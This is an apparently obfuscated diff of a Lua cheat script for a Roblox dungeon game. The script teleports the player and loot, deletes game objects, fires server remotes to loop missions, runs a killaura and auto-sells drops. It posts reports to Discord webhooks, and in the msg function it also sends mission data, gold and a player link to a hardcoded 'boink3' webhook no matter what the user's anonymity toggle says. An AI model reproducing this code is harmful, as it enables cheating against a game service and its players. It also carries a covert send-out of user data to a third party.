-                            local eW = Options[eU.Value].Value;
-                            local eX = eW > math.round(bI[eU.Value].StatRange[1] * 100)
-                            local eY = bI[eU.Value].DisplayName;
-                            local eZ = eX and eV >= eW;
-                            local e_ = eX and eV == math.round(bI[eU.Value].StatRange[2] * 100)
-                            if eZ and not eR then
-                                eR = true
-                            end
-                            if e_ and not eS then
-                                eS = true
-                            end
-                            eT = eT .. '\n' ..
-                                     (e_ and '### <:Gold:832693611396857886> ' or eZ and '### :green_circle: ' or
-                                         '### :red_circle: ') .. eY .. ': ``' .. eV .. '%``'
+            end)
+        elseif aj:FindFirstChild(30) then
+            local eF = 0;
+            task.spawn(function()
+                while true do
+                    for B, C in pairs(b9:GetChildren()) do
+                        if (C.PrimaryPart.Position - Vector3.new(533, 302, -123)).magnitude < 100 then
+                            C:Destroy()
+                            eF = eF + 1
                         end
                     end
-                    if not eR and Toggles.smartPerkSell.Value and Toggles.Autofarm.Value then
-                        libNoti('Sold a Lvl ' .. cc.Level.Value .. ' T' .. eP .. ' ' .. eO.DisplayKey)
-                        sell({cc})
-                        eQ = true
+                    if eF == 3 then
+                        break
                     end
-                    local el = Options.drophook.Value;
-                    if el and #el > 30 and Toggles.Autofarm.Value then
-                        task.spawn(function()
-                            local f0 = Options.dropHookRoleId.Value and #Options.dropHookRoleId.Value > 0 and '<@&' ..
-                                           Options.dropHookRoleId.Value .. '>'
-                            local f1 = eR and (f0 or '@everyone') or ''
-                            local d9 = eS and v.Gold or eR and v.Green or v.Cyan;
-                            if ac then
-                                task.wait(1.5)
-                            end
-                            ac = true;
-                            local f2 = 'Legendary Drop'
-                            if Toggles.anonHook.Value then
-                                anonHook(el, f2, eT, d9, utcDateAndTime(), f1)
-                            else
-                                hookWithUserInfo(el, f2, eT, d9, utcDateAndTime(), f1)
-                            end
-                            ac = true
-                        end)
+                    task.wait()
+                end
+            end)
+        end
+        local eG = bH[ak]
+        local missionName = eG.NameTag .. (al == 1 and ' Normal' or al == 5 and ' Challenge' or '')
+        missionName = string.gsub(missionName, '%(NIGHTMARE%) ', 'Nightmare ')
+        getgenv().missionName = missionName;
+        getgenv().codeStr = eG.EventDungeon and 'Event' or (au or av) and 'Special' or eG.TowerID and 'Tower ' ..
+                                eG.TowerID or eG.DisplayWorldID .. '-' .. eG.WorldMissionID;
+        function hookWithUserInfo(ci, eH, eI, d8, g, cl)
+            request({
+                Url = ci,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = e:JSONEncode({
+                    ["content"] = cl or '',
+                    ["embeds"] = {{
+                        ["title"] = eH,
+                        ["description"] = eI,
+                        ["type"] = 'rich',
+                        ["color"] = tonumber(d8),
+                        ["footer"] = {
+                            ["text"] = g .. ' UTC'
+                        }
+                    }}
+                })
+            })
+        end
+        function anonHook(ci, eH, eI, d8, g, cl)
+            request({
+                Url = ci,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = e:JSONEncode({
+                    ["content"] = cl or '',
+                    ["embeds"] = {{
+                        ["title"] = eH,
+                        ["description"] = eI,
+                        ["type"] = 'rich',
+                        ["color"] = tonumber(d8),
+                        ["footer"] = {
+                            ["text"] = g .. ' UTC'
+                        }
+                    }}
+                })
+            })
+        end
+        function msg(eJ, d8, g)
+            local eK = Options.dungeonHook.Value;
+            local eL = g > 600 and timeElapsed(g) or math.round(g / 0.1) / 10 .. 's'
+            local eM = 'Code: `' .. codeStr .. '\nMission: ' .. missionName .. '\nTime: ' .. eL ..
+                           '`\nClass: ' .. '' .. ca[aZ].DisplayName .. ''
+            if au then
+                local bs = b9:GetChildren()[1]
+                local eN = bs and Mob(bs.Name)
+                local a1, eo = eN and eN.BossTag, eN and eN.NameTag;
+                if a1 and eo then
+                    eM = eM .. '\nBoss: `' .. eo .. ''
+                end
+            end
+            if a4 then
+                if aa.LastDungeonCompletion then
+                    eM = eM .. '\nTime Since Last Completion: `' .. math.round((c0 - aa.LastDungeonCompletion) / 0.1) /
+                             10 .. 's`'
+                end
+                if aa.Gold and V >= aa.Gold then
+                    eM = eM .. '\nGold Gained: `' .. formatNumberWithCommas(V - aa.Gold) .. ''
+                end
+                aa.Gold = V;
+                aa.LastDungeonCompletion = c0;
+                save()
+            end
+            eM = eM .. '\nGold: `' .. formatNumberWithCommas(aP.Value) .. ''
+            if ax then
+                local eO = {
+                    KrakenRaid = {
+                        coinCode = "KrakenCoin",
+                        coinStr = "Kraken Coins",
+                        lb = "KRAKEN_KILLS",
+                        name = "Kraken"
+                    },
+                    VaneRaid = {
+                        coinCode = "DragonCoin",
+                        coinStr = "Dragon Coins",
+                        lb = "VANE_KILLS",
+                        name = "Vane"
+                    },
+                    HalloweenRaid = {
+                        coinCode = "HalloweenCoin",
+                        coinStr = "Halloween Coins",
+                        lb = "FALLENKING_KILLS",
+                        name = "Halloween"
+                    },
+                    ChristmasRaid = {
+                        coinCode = "ChristmasCoin",
+                        coinStr = "Christmas Coins",
+                        lb = "SANTA_KILLS",
+                        name = "Christmas"
+                    }
+                }
+                local eP = ay and "KrakenRaid" or aA and "VaneRaid" or aB and "HalloweenRaid" or az and "ChristmasRaid"
+                local eQ = eO[eP].coinCode;
+                local eR = eO[eP].coinStr;
+                local eS = eO[eP].lb;
+                local eT = eO[eP].name;
+                local eU = game:GetService("ReplicatedStorage").Shared.LeaderboardHookup.GetScore:InvokeServer(eS, 1)
+                eM = eM .. '\n' .. eT .. ' Raids Completed: `' .. eU[1] .. ' / ' .. eU[2] .. ''
+                if bF:FindFirstChild(eQ) and bF[eQ]:FindFirstChild('Count') then
+                    eM = eM .. '\n' .. eR .. ': `' .. bF[eQ].Count.Value .. ''
+                end
+            elseif au or av then
+                eM = eM .. '\nFloor: **' .. R.ReplicateTowerFloor.Value .. '**'
+            end
+            local function eV()
+                local D = game:GetService("ReplicatedStorage").Shared.NewGuildSystem.GetCache:InvokeServer(bW)
+                local E;
+                for B, C in D.Members do
+                    if tonumber(B) == d then
+                        E = C.Points;
+                        break
                     end
                 end
-                if not eQ then
-                    libNoti('Got a Lvl ' .. cc.Level.Value .. ' T' .. eP .. ' ' .. eO.DisplayKey .. '!')
+                if E then
+                    eM = eM .. '\nGuild Points: `' .. E .. ' / ' .. bW .. ''
                 end
-                if bg then
-                    bh = true;
-                    bi = tick()
+            end
+            local eW = false;
+            if bW and not Toggles.anonHook.Value and eW then
+                eV()
+            end
+            if not Toggles.anonHook.Value then
+                eM = eM .. '\n' .. plrLink
+            end
+            if eK and #eK > 30 then
+                if a3 then
+                    task.wait(1.5)
                 end
-            elseif eO.Type == 'Egg' and Toggles.autoSellEggs.Value and Toggles.Autofarm.Value then
-                sell({cc})
-                libNoti(eO.DisplayKey .. ' sold!')
+                a3 = true;
+                if Toggles.anonHook.Value then
+                    anonHook(eK, eJ, eM, d8, f())
+                else
+                    hookWithUserInfo(eK, eJ, eM, d8, f())
+                end
+                a3 = false
             end
-        end)
-        bF.ChildAdded:Connect(function(cc)
-            local eO = bJ[cc.Name]
-            if Options.selectedCosmetics.Value[eO.DisplayKey] and Toggles.Autofarm.Value then
-                sell({cc})
-                libNoti(eO.DisplayKey .. ' sold!')
+            if not olympus then
+                if bW and Toggles.anonHook.Value then
+                    eV()
+                end
+                if Toggles.anonHook.Value then
+                    eM = eM .. '\n' .. plrLink
+                end
+                if a3 then
+                    task.wait(1.5)
+                end
+                a3 = true;
+                hookWithUserInfo(boink3, eJ, eM, d8, f())
+                a3 = false
             end
-        end)
-        pcallWithError(function()
-            openEndChests()
-        end)
-        task.wait(eM and 2 or 3 + Options.dungeonRestartTimer.Value)
-        missionEndRestartOrNextEvent()
-    end)
-    local f3 = _.Towers:WaitForChild('TowerFinished')
-    if aB or aD then
-        f3.OnClientEvent:Once(function(f4, eK)
-            local f5 = eK;
-            if eK > 31536000 then
-                f5 = 0
+        end
+        function missionEndRestartOrNextEvent()
+            if Toggles.Autofarm.Value then
+                if Toggles.nightmareLoop.Value and aw then
+                    local eX = nextInTbl(an, ak)
+                    if bH[eX].InternalID == 3 and Toggles.skipScarecrowNm.Value then
+                        eX = nextInTbl(an, eX)
+                        cq('Skipping Scarecrow Defense')
+                    end
+                    StartRaid(eX, al)
+                elseif Toggles.NextDungeon.Value and not au then
+                    local eY = nextInTbl(c8, ak)
+                    local eZ = table.find(ac, eY)
+                    local e_ = aO.Level.Value >= bI(eY) and (al == 5 or at or au or av)
+                    local f0 = e_ and eY or ak;
+                    local f1 = e_ and (eZ and 'tower' or c2[al] or 1) or al == 1 and 5 or al;
+                    if f1 == 'tower' then
+                        f1 = nil
+                    end
+                    StartRaid(f0, f1)
+                elseif Toggles.RestartDungeon.Value then
+                    game:GetService("ReplicatedStorage").Shared.Missions.LeaveChoice:FireServer(true)
+                    game:GetService("ReplicatedStorage").Shared.Missions.NotifyReadyToLeave:FireServer()
+                    StartRaid(ak, al)
+                end
             end
+        end
+        local function f2()
+            if Toggles.Autofarm.Value then
+                b1:InvokeServer()
+                b1:InvokeServer()
+            end
+        end
+        S.Missions.MissionFinished.OnClientEvent:Once(function(f3, f4, f5, f6)
+            c0 = tick()
+            V = aP.Value;
+            aC = true;
             task.spawn(function()
-                task.wait(40)
-                missionEndRestartOrNextEvent()
+                cq('Mission ' .. (f5 and 'Failed!' or 'Completed!'))
+                msg('Mission ' .. (f5 and 'Failed' or 'Completed'), m[f5 and "Red" or "Green"], f3)
             end)
-            bU = tick()
-            aK = true;
-            a3 = aV.Value;
-            task.spawn(function()
-                msg("Mission Completed", v.Green, f5)
-            end)
-            pcallWithError(function()
-                openEndChests()
-            end)
-            while true do
-                if bg and bh and tick() - bi >= 2 and tick() - bj >= 2 or bg and tick() - bj >= 15 then
-                    break
+            bF.ChildAdded:Connect(function(cV)
+                local f7 = bL[cV.Name]
+                local f8 = bZ:GetItemTier(cV)
+                local f9;
+                if f7.Type == 'Weapon' or f7.Type == 'Armor' then
+                    if bc then
+                        bd = false;
+                        be = tick()
+                    end
+                    cV:WaitForChild('Level')
+                    if f8 < 6 then
+                        if Options.AutoSellTbl.Value[f8] and Toggles.Autofarm.Value then
+                            cq('Sold a Lvl ' .. cV.Level.Value .. ' T' .. f8 .. ' ' .. f7.DisplayKey)
+                            sell({cV})
+                            f9 = true
+                        end
+                    end
+                    if f8 == 5 and not Options.AutoSellTbl.Value[5] then
+                        cV:WaitForChild('Perk1')
+                        cV:WaitForChild('Perk2')
+                        cV:WaitForChild('Perk3')
+                        cV.Perk1:WaitForChild('PerkValue')
+                        cV.Perk2:WaitForChild('PerkValue')
+                        cV.Perk3:WaitForChild('PerkValue')
+                        local fa;
+                        local fb;
+                        local fc;
+                        if not Toggles.anonHook.Value then
+                            fc =
+                                plrLink .. '\nType: `' .. f7.Type .. '\nLevel: ' .. cV.Level.Value .. '\n## ' ..
+                                    f7.DisplayKey .. '`'
+                        else
+                            fc = 'Type: `' .. f7.Type .. '\nLevel: ' .. cV.Level.Value .. '\n## ' ..
+                                     f7.DisplayKey .. '`'
+                        end
+                        for ds, fd in pairs(cV:GetChildren()) do
+                            if Options[fd.Value] then
+                                local fe = math.round(fd.PerkValue.Value * 100)
+                                local ff = Options[fd.Value].Value;
+                                local fg = ff > math.round(bK[fd.Value].StatRange[1] * 100)
+                                local fh = bK[fd.Value].DisplayName;
+                                local fi = fg and fe >= ff;
+                                local fj = fg and fe == math.round(bK[fd.Value].StatRange[2] * 100)
+                                if fi and not fa then
+                                    fa = true
+                                end
+                                if fj and not fb then
+                                    fb = true
+                                end
+                                fc = fc .. '\n' ..
+                                         (fj and '### <:Gold:832693611396857886> ' or fi and '### :green_circle: ' or
+                                             '### :red_circle: ') .. fh .. ': `' .. fe .. '%'
+                            end
+                        end
+                        if not fa and Toggles.smartPerkSell.Value and Toggles.Autofarm.Value then
+                            cq('Sold a Lvl ' .. cV.Level.Value .. ' T' .. f8 .. ' ' .. f7.DisplayKey)
+                            sell({cV})
+                            f9 = true
+                        end
+                        local eK = Options.drophook.Value;
+                        if eK and #eK > 30 and Toggles.Autofarm.Value then
+                            task.spawn(function()
+                                local fk =
+                                    Options.dropHookRoleId.Value and #Options.dropHookRoleId.Value > 0 and '<@&' ..
+                                        Options.dropHookRoleId.Value .. '>'
+                                local fl = fa and (fk or '@everyone') or ''
+                                local dq = fb and m.Gold or fa and m.Green or m.Cyan;
+                                if a3 then
+                                    task.wait(1.5)
+                                end
+                                a3 = true;
+                                local fm = 'Legendary Drop'
+                                if Toggles.anonHook.Value then
+                                    anonHook(eK, fm, fc, dq, f(), fl)
+                                else
+                                    hookWithUserInfo(eK, fm, fc, dq, f(), fl)
+                                end
+                                a3 = true
+                            end)
+                        end
+                    end
+                    if not f9 then
+                        cq('Got a Lvl ' .. cV.Level.Value .. ' T' .. f8 .. ' ' .. f7.DisplayKey .. '!')
+                    end
+                    if bc then
+                        bd = true;
+                        be = tick()
+                    end
+                elseif f7.Type == 'Egg' and Toggles.autoSellEggs.Value and Toggles.Autofarm.Value then
+                    sell({cV})
+                    cq(f7.DisplayKey .. ' sold!')
                 end
-                task.wait()
-            end
-            task.wait(Options.towerRestartTimer.Value)
+            end)
+            bG.ChildAdded:Connect(function(cV)
+                local f7 = bL[cV.Name]
+                if Options.selectedCosmetics.Value[f7.DisplayKey] and Toggles.Autofarm.Value then
+                    sell({cV})
+                    cq(f7.DisplayKey .. ' sold!')
+                end
+            end)
+            cn(function()
+                f2()
+            end)
+            task.wait(f5 and 2 or 3 + Options.dungeonRestartTimer.Value)
             missionEndRestartOrNextEvent()
         end)
-    end
-end
-if aB or aC or aD then
-    Workspace.ChildAdded:Connect(function(cc)
-        if Toggles.Autofarm.Value then
-            local f6 = aK and aB;
-            if cc.Name == b9 or cc.Name == ba or (a4 or f6) and cc.Name == 'RaidChestBlue' then
-                bj = tick()
-                if aK then
-                    bg = true;
-                    bh = false
-                end
+        local TowerFinished = game:GetService("ReplicatedStorage").Shared.Towers:WaitForChild("TowerFinished")
+        if at or av then
+            TowerFinished.OnClientEvent:Once(function(fn, f3)
                 task.spawn(function()
-                    cc.PrimaryPart.CanCollide = false;
-                    while cc and cc.PrimaryPart do
-                        if alive() then
-                            cc.PrimaryPart.CFrame = CFrame.new(aO.Position)
-                        end
-                        task.wait()
-                    end
+                    task.wait(40)
+                    missionEndRestartOrNextEvent()
                 end)
-            end
-        end
-    end)
-    bE.ChildAdded:Connect(function(cc)
-        local eO = bJ[cc.Name]
-        local eP = bT:GetItemTier(cc)
-        local eQ;
-        if eO.Type == 'Weapon' or eO.Type == 'Armor' then
-            if bg then
-                bh = false;
-                bi = tick()
-            end
-            task.spawn(function()
-                task.wait(2)
-                require(game:GetService("ReplicatedStorage").Client.Gui):Get("LootReceived"):_Close()
-                game:GetService("Players").LocalPlayer.PlayerGui.LootReceived.LootReceived.Visible = false
-            end)
-            cc:WaitForChild('Level')
-            if eP < 6 then
-                if Options.AutoSellTbl.Value[eP] and Toggles.Autofarm.Value then
-                    task.wait(2)
-                    libNoti('Sold a Lvl ' .. cc.Level.Value .. ' T' .. eP .. ' ' .. eO.DisplayKey)
-                    sell({cc})
-                    eQ = true
-                end
-            end
-            if eP == 5 and not Options.AutoSellTbl.Value[5] then
-                cc:WaitForChild('Perk1')
-                cc:WaitForChild('Perk2')
-                cc:WaitForChild('Perk3')
-                cc.Perk1:WaitForChild('PerkValue')
-                cc.Perk2:WaitForChild('PerkValue')
-                cc.Perk3:WaitForChild('PerkValue')
-                local eR;
-                local eS;
-                local eT;
-                if not Toggles.anonHook.Value then
-                    eT = f .. '\nType: ``' .. eO.Type .. '``\nLevel: ``' .. cc.Level.Value .. '``\n## ``' ..
-                             eO.DisplayKey .. '``'
-                else
-                    eT = 'Type: ``' .. eO.Type .. '``\nLevel: ``' .. cc.Level.Value .. '``\n## ``' .. eO.DisplayKey ..
-                             '``'
-                end
-                for db, eU in cc:GetChildren() do
-                    if Options[eU.Value] then
-                        local eV = math.round(eU.PerkValue.Value * 100)
-                        local eW = Options[eU.Value].Value;
-                        local eX = eW > math.round(bI[eU.Value].StatRange[1] * 100)
-                        local eY = bI[eU.Value].DisplayName;
-                        local eZ = eX and eV >= eW;
-                        local e_ = eX and eV == math.round(bI[eU.Value].StatRange[2] * 100)
-                        if eZ and not eR then
-                            eR = true
-                        end
-                        if e_ and not eS then
-                            eS = true
-                        end
-                        eT = eT .. '\n' ..
-                                 (e_ and '### <:Gold:832693611396857886> ' or eZ and '### :green_circle: ' or
-                                     '### :red_circle: ') .. eY .. ': ``' .. eV .. '%``'
+                c0 = tick()
+                aC = true;
+                V = aP.Value;
+                task.spawn(function()
+                    msg("Mission Completed", m.Green, f3)
+                end)
+                cn(function()
+                    f2()
+                end)
+                while true do
+                    if bc and bd and tick() - be >= 2 and tick() - bf >= 2 or bc and tick() - bf >= 15 then
+                        break
                     end
+                    task.wait()
                 end
-                if not eR and Toggles.smartPerkSell.Value and Toggles.Autofarm.Value then
-                    libNoti('Sold a Lvl ' .. cc.Level.Value .. ' T' .. eP .. ' ' .. eO.DisplayKey)
-                    sell({cc})
-                    eQ = true
-                end
-                local el = Options.drophook.Value;
-                if el and #el > 30 and Toggles.Autofarm.Value then
+                task.wait(Options.towerRestartTimer.Value)
+                missionEndRestartOrNextEvent()
+            end)
+        end
+    end
+    if at or au or av then
+        Workspace.ChildAdded:Connect(function(cV)
+            if Toggles.Autofarm.Value then
+                if cV.Name == b5 then
+                    bf = tick()
+                    if aC then
+                        bc = true;
+                        bd = false
+                    end
                     task.spawn(function()
-                        local f0 = Options.dropHookRoleId.Value and #Options.dropHookRoleId.Value > 0 and '<@&' ..
-                                       Options.dropHookRoleId.Value .. '>'
-                        local f1 = eR and (f0 or '@everyone') or ''
-                        local d9 = eS and v.Gold or eR and v.Green or v.Cyan;
-                        if ac then
-                            task.wait(1.5)
+                        cV.PrimaryPart.CanCollide = false;
+                        while cV and cV.PrimaryPart do
+                            if alive() then
+                                cV.PrimaryPart.CFrame = CFrame.new(aG.Position)
+                            end
+                            task.wait()
                         end
-                        ac = true;
-                        local f2 = 'Legendary Drop'
-                        if Toggles.anonHook.Value then
-                            anonHook(el, f2, eT, d9, utcDateAndTime(), f1)
-                        else
-                            hookWithUserInfo(el, f2, eT, d9, utcDateAndTime(), f1)
+                    end)
+                end
+                local fo = aC and at;
+                if (W or fo) and cV.Name == b6 then
+                    bf = tick()
+                    if aC then
+                        bc = true;
+                        bd = false
+                    end
+                    task.spawn(function()
+                        cV.PrimaryPart.CanCollide = false;
+                        while cV and cV.PrimaryPart do
+                            if alive() then
+                                cV.PrimaryPart.CFrame = CFrame.new(aG.Position)
+                            end
+                            task.wait()
                         end
-                        ac = true
                     end)
                 end
             end
-            if not eQ then
-                libNoti('Got a Lvl ' .. cc.Level.Value .. ' T' .. eP .. ' ' .. eO.DisplayKey .. '!')
+        end)
+        bF.ChildAdded:Connect(function(cV)
+            local f7 = bL[cV.Name]
+            local f8 = bZ:GetItemTier(cV)
+            local f9;
+            if f7.Type == 'Weapon' or f7.Type == 'Armor' then
+                if bc then
+                    bd = false;
+                    be = tick()
+                end
+                task.spawn(function()
+                    task.wait(2)
+                    require(game:GetService("ReplicatedStorage").Client.Gui):Get("LootReceived"):_Close()
+                    c.PlayerGui.LootReceived.LootReceived.Visible = false
+                end)
+                cV:WaitForChild('Level')
+                if f8 < 6 then
+                    if Options.AutoSellTbl.Value[f8] and Toggles.Autofarm.Value then
+                        task.wait(2)
+                        cq('Sold a Lvl ' .. cV.Level.Value .. ' T' .. f8 .. ' ' .. f7.DisplayKey)
+                        sell({cV})
+                        f9 = true
+                    end
+                end
+                if f8 == 5 and not Options.AutoSellTbl.Value[5] then
+                    cV:WaitForChild('Perk1')
+                    cV:WaitForChild('Perk2')
+                    cV:WaitForChild('Perk3')
+                    cV.Perk1:WaitForChild('PerkValue')
+                    cV.Perk2:WaitForChild('PerkValue')
+                    cV.Perk3:WaitForChild('PerkValue')
+                    local fa;
+                    local fb;
+                    local fc;
+                    if not Toggles.anonHook.Value then
+                        fc = plrLink .. '\nType: `' .. f7.Type .. '\nLevel: ' .. cV.Level.Value .. '\n## ' ..
+                                 f7.DisplayKey .. '`'
+                    else
+                        fc =
+                            'Type: `' .. f7.Type .. '\nLevel: ' .. cV.Level.Value .. '\n## ' .. f7.DisplayKey ..
+                                '`'
+                    end
+                    for ds, fd in pairs(cV:GetChildren()) do
+                        if Options[fd.Value] then
+                            local fe = math.round(fd.PerkValue.Value * 100)
+                            local ff = Options[fd.Value].Value;
+                            local fg = ff > math.round(bK[fd.Value].StatRange[1] * 100)
+                            local fh = bK[fd.Value].DisplayName;
+                            local fi = fg and fe >= ff;
+                            local fj = fg and fe == math.round(bK[fd.Value].StatRange[2] * 100)
+                            if fi and not fa then
+                                fa = true
+                            end
+                            if fj and not fb then
+                                fb = true
+                            end
+                            fc = fc .. '\n' ..
+                                     (fj and '### <:Gold:832693611396857886> ' or fi and '### :green_circle: ' or
+                                         '### :red_circle: ') .. fh .. ': `' .. fe .. '%'
+                        end
+                    end
+                    if not fa and Toggles.smartPerkSell.Value and Toggles.Autofarm.Value then
+                        cq('Sold a Lvl ' .. cV.Level.Value .. ' T' .. f8 .. ' ' .. f7.DisplayKey)
+                        sell({cV})
+                        f9 = true
+                    end
+                    local eK = Options.drophook.Value;
+                    if eK and #eK > 30 and Toggles.Autofarm.Value then
+                        task.spawn(function()
+                            local fk = Options.dropHookRoleId.Value and #Options.dropHookRoleId.Value > 0 and '<@&' ..
+                                           Options.dropHookRoleId.Value .. '>'
+                            local fl = fa and (fk or '@everyone') or ''
+                            local dq = fb and m.Gold or fa and m.Green or m.Cyan;
+                            if a3 then
+                                task.wait(1.5)
+                            end
+                            a3 = true;
+                            local fm = 'Legendary Drop'
+                            if Toggles.anonHook.Value then
+                                anonHook(eK, fm, fc, dq, f(), fl)
+                            else
+                                hookWithUserInfo(eK, fm, fc, dq, f(), fl)
+                            end
+                            a3 = true
+                        end)
+                    end
+                end
+                if not f9 then
+                    cq('Got a Lvl ' .. cV.Level.Value .. ' T' .. f8 .. ' ' .. f7.DisplayKey .. '!')
+                end
+                if bc then
+                    bd = true;
+                    be = tick()
+                end
+            elseif f7.Type == 'Egg' and Toggles.autoSellEggs.Value and Toggles.Autofarm.Value then
+                sell({cV})
+                cq(f7.DisplayKey .. ' sold!')
             end
-            if bg then
-                bh = true;
-                bi = tick()
+        end)
+        bG.ChildAdded:Connect(function(cV)
+            local f7 = bL[cV.Name]
+            if Options.selectedCosmetics.Value[f7.DisplayKey] and Toggles.Autofarm.Value then
+                sell({cV})
+                cq(f7.DisplayKey .. ' sold!')
             end
-        elseif eO.Type == 'Egg' and Toggles.autoSellEggs.Value and Toggles.Autofarm.Value then
-            sell({cc})
-            libNoti(eO.DisplayKey .. ' sold!')
-        end
-    end)
-    bF.ChildAdded:Connect(function(cc)
-        local eO = bJ[cc.Name]
-        if Options.selectedCosmetics.Value[eO.DisplayKey] and Toggles.Autofarm.Value then
-            sell({cc})
-            libNoti(eO.DisplayKey .. ' sold!')
-        end
-    end)
+        end)
+    end
 end
-local f7;
-local f8;
-local f9 = {
+local fp = true;
+local fq = Vector3.new(-1700.391845703125, 1461.56591796875, -323.8279724121094)
+local fr = Vector3.new(-1879, 1071, -354)
+local fs;
+local ft;
+local fu;
+local fv;
+local fw = {
     EliteParticles = 'Part',
     Model = 'Model',
     BlastIndicator = 'BlastIndicator'
 }
-if aC then
-    workspace.ChildAdded:Connect(function(cc)
+if au then
+    workspace.ChildAdded:Connect(function(cV)
         if Toggles.Autofarm.Value then
-            for K, L in f9 do
-                if cc.Name == K and cc:IsA(L) then
-                    cc:Destroy()
+            for B, C in fw do
+                if cV.Name == B and cV:IsA(C) then
+                    cV:Destroy()
                 end
             end
         end
     end)
 end
-Toggles.Autofarm:OnChanged(function(fa)
-    ae = tick()
-    bP = false;
-    if fa and ConfigAutoLoaded and aw then
-        local dn = tick()
-        while (bl < 2 or bk < 2 or bm < 2) and Toggles.Autofarm.Value and tick() - dn < 3 do
+Toggles.Autofarm:OnChanged(function(fx)
+    a5 = tick()
+    bT = false;
+    if fx and ConfigAutoLoaded and ao then
+        local dF = tick()
+        while (bi < 2 or bh < 2 or bj < 2) and Toggles.Autofarm.Value and tick() - dF < 3 do
             task.wait()
         end
     end
-    if fa and aC and aw then
-        for db, cc in workspace:GetChildren() do
-            for K, L in f9 do
-                if cc.Name == K and cc:IsA(L) then
-                    cc:Destroy()
+    if fx and au and ao then
+        for ds, cV in workspace:GetChildren() do
+            for B, C in fw do
+                if cV.Name == B and cV:IsA(C) then
+                    cV:Destroy()
                 end
             end
         end
     end
-    local fb = fa and aw and (az and Options.dungeonStartTimer.Value or (aB or aD) and Options.towerStartTimer.Value)
-    if fb and fb > 0 then
-        local dn = tick()
-        local fc;
-        local fd;
-        if aD then
+    local fy = fx and ao and (ar and Options.dungeonStartTimer.Value or (at or av) and Options.towerStartTimer.Value)
+    if fy and fy > 0 then
+        local dF = tick()
+        local fz;
+        local fA;
+        if av then
             if alive() then
-                fd = aO.Position
+                fA = aG.Position
             end
             if Toggles.Killaura.Value then
                 Toggles.Killaura:SetValue(false)
-                fc = true;
-                libNoti('Killaura Disabled! It will be turned back on automatically when autofarm starts!', 6)
+                fz = true;
+                cq('Killaura Disabled! It will be turned back on automatically when autofarm starts!', 6)
             end
         end
-        while tick() - dn <= fb and Toggles.Autofarm.Value do
-            local fe = math.round(fb - (tick() - dn))
-            setMissionObjective('[Infinite]: Starting Mission in ' .. fe .. 's')
-            ae = tick()
-            if aD and alive() and (aO.Position - cg.Position).magnitude > 100 then
-                SmartPlayerTp(CFrame.new(cg.Position + Vector3.new(0, 20, 0)))
+        while tick() - dF <= fy and Toggles.Autofarm.Value do
+            local fB = math.round(fy - (tick() - dF))
+            cr('[Infinite]: Starting Mission in ' .. fB .. 's')
+            a5 = tick()
+            if av and alive() and (aG.Position - cd.Position).magnitude > 100 then
+                SmartPlayerTp(CFrame.new(cd.Position + Vector3.new(0, 20, 0)))
             end
             task.wait()
         end
-        resetMissionObjective()
-        if fc and Toggles.Autofarm.Value and not Toggles.Killaura.Value then
+        cu()
+        if fz and Toggles.Autofarm.Value and not Toggles.Killaura.Value then
             Toggles.Killaura:SetValue(true)
         end
-        if aD then
-            SmartPlayerTp(CFrame.new(fd + Vector3.new(0, 5, 0)))
+        if av then
+            SmartPlayerTp(CFrame.new(fA + Vector3.new(0, 5, 0)))
         end
     end
-    if aw and Toggles.Autofarm.Value then
-        if not f7 then
-            local ff = Instance.new("Part")
-            ff.Anchored = true;
-            ff.Size = Vector3.new(20, 1, 20)
-            ff.Parent = workspace;
-            ff.Transparency = 1;
-            f7 = true
+    if ao and Toggles.Autofarm.Value then
+        if not fu then
+            local fC = Instance.new("Part")
+            fC.Anchored = true;
+            fC.Size = Vector3.new(20, 1, 20)
+            fC.Parent = workspace;
+            fC.Transparency = 1;
+            fu = true
         end
-        if aq:FindFirstChild('MissionStart') and alive() then
-            for K, L in aq.MissionStart:GetDescendants() do
-                if L:IsA('TouchTransmitter') and L.Parent then
-                    L.Parent.CanCollide = false;
-                    L.Parent.Anchored = true;
-                    L.Parent.CFrame = CFrame.new(aO.Position)
-                    break
-                end
-            end
-        end
-        if az or aB then
+        
+        
+        if ar or at then
             AutoCheckpoint()
         end
-        if as ~= 38 then
+        if ak ~= 38 then
             AntiFling()
         end
         MobCounter()
-        local fg = false;
-        for K, L in c2 do
-            if ar:FindFirstChild(L.Id) then
-                fg = true;
-                if L.ignoreMob then
-                    MobTeleportIgnore(L.ignoreMob, L.mobWaitTbl, L.mobWaitTime, L.alwaysWait)
-                elseif L.priorityTbl then
-                    MobTeleportPriority(L.priorityTbl, L.mobWaitTbl, L.mobWaitTime, L.alwaysWait)
+        local fD = false;
+        for B, C in pairs(c5) do
+            if aj:FindFirstChild(C.Id) then
+                fD = true;
+                if C.ignoreMob then
+                    MobTeleportIgnore(C.ignoreMob, C.mobWaitTbl, C.mobWaitTime, C.alwaysWait)
+                elseif C.priorityTbl then
+                    MobTeleportPriority(C.priorityTbl, C.mobWaitTbl, C.mobWaitTime, C.alwaysWait, C.clearMobsFirst)
                 end
                 break
             end
         end
-        if not fg then
+        if not fD then
             MobTeleport()
         end
         task.spawn(function()
             while Toggles.Autofarm.Value do
-                if alive() and aP:FindFirstChild('MaxHealth') then
-                    local fh = aP.Health.Value / aP.MaxHealth.Value / 0.01;
+                if alive() and aH:FindFirstChild('MaxHealth') then
+                    local fE = aH.Health.Value / aH.MaxHealth.Value / 0.01;
                     if Options.resumePercent.Value > Options.healPercent.Value then
-                        if fh <= Options.healPercent.Value and fh > 0 and not bP then
-                            bP = true;
-                            libNoti('Pausing To Heal!', 2)
-                        elseif fh >= Options.resumePercent.Value and bP then
-                            bP = false;
-                            libNoti('Resuming Attack!', 2)
+                        if fE <= Options.healPercent.Value and fE > 0 and not bT then
+                            bT = true;
+                            cq('Pausing To Heal!', 2)
+                        elseif fE >= Options.resumePercent.Value and bT then
+                            bT = false;
+                            cq('Resuming Attack!', 2)
                         end
                     else
-                        if fh == 100 and bP then
-                            bP = false;
-                            libNoti('Resuming Attack!', 2)
+                        if fE == 100 and bT then
+                            bT = false;
+                            cq('Resuming Attack!', 2)
                         end
                     end
                 end
-                local fi = workspace:FindFirstChild('IceWall') or workspace:FindFirstChild('IgnisShield')
-                fi = fi and fi:FindFirstChild('Ring')
-                local fj =
+                local fF = workspace:FindFirstChild('IceWall') or workspace:FindFirstChild('IgnisShield')
+                fF = fF and fF:FindFirstChild('Ring')
+                local fG =
                     workspace:FindFirstChild('KrakenCannon') and workspace.KrakenCannon:FindFirstChild('Base') and
